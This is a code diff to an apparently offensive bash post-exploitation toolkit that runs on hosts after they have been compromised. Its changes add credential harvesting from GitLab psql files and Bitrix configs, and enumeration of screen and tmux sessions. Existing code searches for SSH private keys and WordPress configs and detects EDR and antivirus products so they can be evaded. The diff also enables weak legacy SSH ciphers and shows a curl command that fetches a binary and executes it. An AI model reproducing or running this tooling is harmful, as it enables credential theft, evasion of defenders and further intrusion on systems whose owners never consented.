@@ -730,7 +730,7 @@ loot_sshkey() {
     local str
     local fn="${1}"
 
-    { [ -z "$s" ] || [ ! -s "${fn}" ]; } && return
+    [ ! -s "${fn}" ] && return
     grep -Fqam1 'PRIVATE KEY' "${fn}" || return
 
     [ -n "$_HS_SETSID_WAIT" ] && {
@@ -742,14 +742,28 @@ loot_sshkey() {
     echo -en "${CN}"
 }
 
+loot_gitlab() {
+    local fn="${1:?}"
+    local str
+    [ ! -f "$fn" ] && return
+    str="$(grep -i --color=never ^psql "${fn}")"
+    [ -z "$str" ] && return
+    echo -e "${CB}GitLab-DB ${CDY}${fn}${CF}"
+    echo "$str"
+    echo -en "${CN}"
+}
+
 loot_bitrix() {
     local fn="${1:?}"
+    local str
     [ ! -f "$fn" ] && return
     grep -Fqam1 '$_ENV[' "$fn" && return
-    echo -e "${CB}Bitrix-DB ${CDY}${fn}${CF}"
     # 'password' => 'abcd',
     # $DBPassword = 'abcd';
-    grep -i --color=never -E "(host|database|login|Password).*=.* '" "${fn}" | sed 's/\s*//g'
+    str="$(grep -i --color=never -E '(host|database|DBName|login|Password).*=.* ["'"'"']' "${fn}" | sed 's/\s*//g')"
+    [ -z "$str" ] && return
+    echo -e "${CB}Bitrix-DB ${CDY}${fn}${CF}"
+    echo "$str"
     echo -en "${CN}"
 }
 
@@ -888,6 +902,7 @@ command -v gs-netcat >/dev/null || gs-netcat() { gsnc "$@"; }
 _warn_edr() {
     local fns s out
 
+    fns=()
     _hs_chk_systemd() { systemctl is-active "${1:?}" &>/dev/null && out+="${2:?}: systemctl status $1"$'\n';}
     _hs_chk_fn() { { [ -z "${1}" ] || [ ! -e "${1:?}" ]; } && return; fns+=("${1:?}"); out+="${2:?}: $1"$'\n';}
 
@@ -949,7 +964,7 @@ _warn_edr() {
     _hs_chk_fn "/etc/opt/f-secure"                          "WithSecure (F-Secure)"
     _hs_chk_fn "/opt/f-secure"                              "WithSecure (F-Secure)"
 
-    [ "${#fns[@]}" -ne 0 ] && out+="$(\ls -alrtd "${fns[@]}")"$'\n'
+    [ "${#fns[@]}" -gt 0 ] && out+="$(\ls -alrtd "${fns[@]}")"$'\n'
 
     _hs_chk_systemd "avast"                             "Avast"
     _hs_chk_systemd "bdsec"                             "Bitdefender EDR / GavityZone XDR"
@@ -1023,7 +1038,9 @@ _hs_gen_home() {
             HS_WARN "Directory not found: HOMEDIR='${HOMEDIR}'"
         fi
     else
-        str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ -d "$d" ] && echo "$d"; done; [ -d /var/www ] && echo "/var/www"; } | sort -u)"
+        # str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ -d "$d" ] && echo "$d"; done; [ -d /var/www ] && echo "/var/www"; } | sort -u)"
+        str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ -d "$d" ] && echo "$d"; done; } | sort -u)"
+        [[ "$str" != *"/var/www"* ]] && str+="/var/www"$'\n'
     fi
 
     set -f
@@ -1160,6 +1177,20 @@ lootmore() {
     echo -e "${CW}TIP:${CN} Type ${CDC}ws${CN} to find out more about this host."
 }
 
+# <NAME> <COMMAND> ...
+loot_cmd() {
+    local name="$1"
+    local str
+
+    shift 1
+    str="$("$@" 2>/dev/null)"
+    [ -z "$str" ] && return
+
+    echo -e "${CB}${name}${CDY}${CF}"
+    echo "$str"
+    echo -en "${CN}"
+}
+
 # Someone shall implement a sub-set from TeamTNT's tricks (use
 # noseyparker for cpu/time-intesive looting). TeamTNT's infos:
 # https://malware.news/t/cloudy-with-a-chance-of-credentials-aws-targeting-cred-stealer-expands-to-azure-gcp/71346
@@ -1189,16 +1220,13 @@ loot() {
     done
 
     ### Bitrix
-    # for hn in "${HOMEDIRARR[@]}"; do
-    #     [[ "$hn" == "/var/www"* ]] && continue
-    #     for fn in "${hn}"/*/bitrix/.settings.php; do
-    #         loot_bitrix "$fn"
-    #     done
-    # done
-
+    # HOMEDIRARR includes all from /etc/passwd + /var/www 
     find "${HOMEDIRARR[@]}" -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" -o -wholename "*/bitrix/php_interface/dbconn.php" 2>/dev/null | while read -r fn; do
         loot_bitrix "$fn"
     done
+
+    loot_gitlab /opt/gitlab/etc/gitlab-psql-rc
+    loot_gitlab /etc/gitlab-psql-rc
 
     find "${HOMEDIRARR[@]}" -maxdepth 3 -type f -name wp-config.php 2>/dev/null | while read -r fn; do
         _loot_wp "$fn"
@@ -1242,7 +1270,10 @@ loot() {
         }
     }
 
-    [ "$UID" -ne 0 ] && {
+    loot_cmd "Screen (screen -ls)" screen -ls
+    loot_cmd "Tmux" tmux list-s
+
+    [ "$UID" -gt 0 ] && {
         echo -e "${CW}TIP:${CN} Type ${CDC}sudo -v${CN} and ${CDC}sudo -ln${CN} to list sudo perms. ${CF}[may log to auth.log]${CN}"
     }
 
@@ -1488,6 +1519,9 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
         # User can set SSH_NO_OLD before hs to disable old ciphers.
         [ -z "$SSH_NO_OLD" ] && \ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -V 2>/dev/null && HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
         [ -z "$SSH_NO_OLD" ] && \ssh -oHostKeyAlgorithms=+ssh-dss -V 2>/dev/null && HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
+        [ -z "$SSH_NO_OLD" ] && \ssh -oCiphers=+aes128-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+aes128-cbc")
+        [ -z "$SSH_NO_OLD" ] && \ssh -oCiphers=+3des-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+3des-cbc")
+
         HS_SSH_OPT+=("-oConnectTimeout=5")
         HS_SSH_OPT+=("-oServerAliveInterval=30")
     }
